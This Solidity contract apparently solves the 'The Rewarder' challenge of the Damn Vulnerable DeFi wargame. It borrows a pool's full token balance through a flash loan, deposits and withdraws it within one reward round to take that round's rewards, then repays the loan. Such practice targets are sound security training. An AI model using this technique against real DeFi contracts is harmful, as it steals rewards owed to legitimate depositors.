// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract RewardExploiter {

    FlashLoanerPool public immutable flashPool;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public immutable rewarderPool;
    RewardToken public immutable rewards;
    address public immutable owner;

    constructor(address _flashPool, address _liquidityToken, address _rewarderPool, address _rewardToken){
        flashPool = FlashLoanerPool(_flashPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewarderPool = TheRewarderPool(_rewarderPool);
        rewards = RewardToken(_rewardToken);
        owner = msg.sender;
    }

    function initFlashLoan() external {
        require(rewarderPool.isNewRewardsRound(), 'need new round');
        require(msg.sender == owner, 'only owner can call');
        flashPool.flashLoan(liquidityToken.balanceOf(address(flashPool)));
    }
    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashPool));
        SafeTransferLib.safeApprove(address(liquidityToken), address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashPool), amount);
    } 

    function withdrawMe() external {
        require(msg.sender == owner, 'only owner can call');
        rewards.transfer(msg.sender, rewards.balanceOf(address(this)));
    }
     // need to receive ether
    receive() external payable {}  
}